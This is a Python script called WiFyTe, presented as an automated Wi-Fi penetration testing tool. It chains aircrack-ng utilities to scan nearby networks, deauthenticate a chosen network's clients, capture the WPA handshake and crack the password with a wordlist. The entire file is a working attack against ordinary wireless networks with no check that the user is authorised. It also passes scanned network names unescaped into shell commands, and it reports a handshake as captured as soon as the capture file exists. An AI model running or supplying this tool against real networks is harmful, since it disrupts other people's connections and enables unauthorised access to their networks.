#!/usr/bin/env python3

import os
import subprocess
import sys
import time


def run_command(command):
    """Helper function to run shell commands."""
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        print(f"Error running command: {e}")
        sys.exit(1)


def detect_monitor_interfaces():
    """Detect network interfaces that support monitor mode."""
    stdout, _ = run_command("iwconfig 2>&1")
    interfaces = []
    for line in stdout.split("\n"):
        if "IEEE 802.11" in line and "ESSID" in line:
            interface = line.split()[0]
            interfaces.append(interface)
    return interfaces


def enable_monitor_mode(interface):
    """Enable monitor mode on the given interface."""
    print(f"Enabling monitor mode on {interface}...")
    run_command(f"sudo airmon-ng check kill")
    run_command(f"sudo airmon-ng start {interface}")
    monitor_interface = f"{interface}mon"
    return monitor_interface


def scan_networks(monitor_interface):
    """Scan for nearby Wi-Fi networks and display them to the user."""
    print("Scanning for Wi-Fi networks...")
    scan_file = "scan_result-01.csv"

    # Hapus file CSV sebelumnya jika ada
    if os.path.exists(scan_file):
        os.remove(scan_file)

    # Jalankan airodump-ng selama 10 detik
    process = subprocess.Popen(
        f"sudo airodump-ng --output-format csv -w scan_result {monitor_interface}",
        shell=True,
    )
    print("Scanning... Please wait for 10 seconds.")
    time.sleep(10)  # Biarkan pemindaian berjalan selama 10 detik
    process.terminate()  # Hentikan proses airodump-ng

    # Periksa apakah file CSV dihasilkan
    if not os.path.exists(scan_file):
        print(
            "Failed to generate scan results. Please check your wireless interface and monitor mode."
        )
        sys.exit(1)

    # Baca file CSV
    with open(scan_file, "r") as f:
        lines = f.readlines()

    networks = []
    for line in lines[2:]:
        if line.strip() == "":
            break
        parts = [part.strip() for part in line.split(",")]
        bssid = parts[0]
        channel = parts[3]
        essid = parts[13].strip('"')
        if essid:
            networks.append({"BSSID": bssid, "Channel": channel, "ESSID": essid})

    if not networks:
        print(
            "No Wi-Fi networks detected. Please ensure monitor mode is enabled and try again."
        )
        sys.exit(1)

    print("\nAvailable Wi-Fi Networks:")
    for i, network in enumerate(networks):
        print(
            f"{i + 1}. {network['ESSID']} (BSSID: {network['BSSID']}, Channel: {network['Channel']})"
        )

    return networks


def select_target(networks):
    """Prompt the user to select a target network."""
    while True:
        try:
            choice = int(input("\nEnter the number of the target network: "))
            if 1 <= choice <= len(networks):
                return networks[choice - 1]
            else:
                print("Invalid choice. Please try again.")
        except ValueError:
            print("Please enter a valid number.")


def capture_handshake(monitor_interface, target):
    """Capture the WPA handshake for the target network."""
    print(f"\nCapturing handshake for {target['ESSID']}...")
    output_file = f"{target['ESSID']}_capture"
    command = f"sudo airodump-ng --bssid {target['BSSID']} -c {target['Channel']} -w {output_file} {monitor_interface}"
    process = subprocess.Popen(command, shell=True)

    # Deauthenticate clients
    print("Deauthenticating clients to force reconnection...")
    deauth_command = (
        f"sudo aireplay-ng --deauth 10 -a {target['BSSID']} {monitor_interface}"
    )
    run_command(deauth_command)

    # Check for handshake
    print("Waiting for handshake...")
    while True:
        if os.path.exists(f"{output_file}-01.cap"):
            print("Handshake captured!")
            process.terminate()
            return f"{output_file}-01.cap"
        else:
            time.sleep(1)


def crack_password(capture_file, target):
    """Attempt to crack the password using the provided wordlist."""
    wordlist = "wifyte.txt"
    if not os.path.exists(wordlist):
        print(f"Wordlist '{wordlist}' not found. Exiting.")
        sys.exit(1)

    print(f"\nCracking password using wordlist '{wordlist}'...")
    stdout, _ = run_command(
        f"sudo aircrack-ng -w {wordlist} -b {target['BSSID']} {capture_file}"
    )
    if "KEY FOUND!" in stdout:
        password = stdout.split("KEY FOUND!")[1].split("[")[1].split("]")[0]
        print(f"Password cracked successfully: {password}")
        return password
    else:
        print("Failed to crack the password.")
        return None


def disable_monitor_mode(monitor_interface):
    """Disable monitor mode on the given interface."""
    print(f"Disabling monitor mode on {monitor_interface}...")
    run_command(f"sudo airmon-ng stop {monitor_interface}")


if __name__ == "__main__":
    print("Welcome to WiFyTe - Automated Wi-Fi Penetration Testing Tool\n")
    interfaces = detect_monitor_interfaces()
    if not interfaces:
        print("No wireless interfaces found that support monitor mode. Exiting.")
        sys.exit(1)

    print("Detected wireless interfaces:")
    for i, interface in enumerate(interfaces):
        print(f"{i + 1}. {interface}")

    choice = int(input("Select an interface to use: ")) - 1
    selected_interface = interfaces[choice]

    monitor_interface = enable_monitor_mode(selected_interface)
    networks = scan_networks(monitor_interface)
    target = select_target(networks)
    capture_file = capture_handshake(monitor_interface, target)
    password = crack_password(capture_file, target)

    cleanup = input("\nDo you want to disable monitor mode? (y/n): ").lower()
    if cleanup == "y":
        disable_monitor_mode(monitor_interface)

    print("Exiting WiFyTe. Goodbye!")
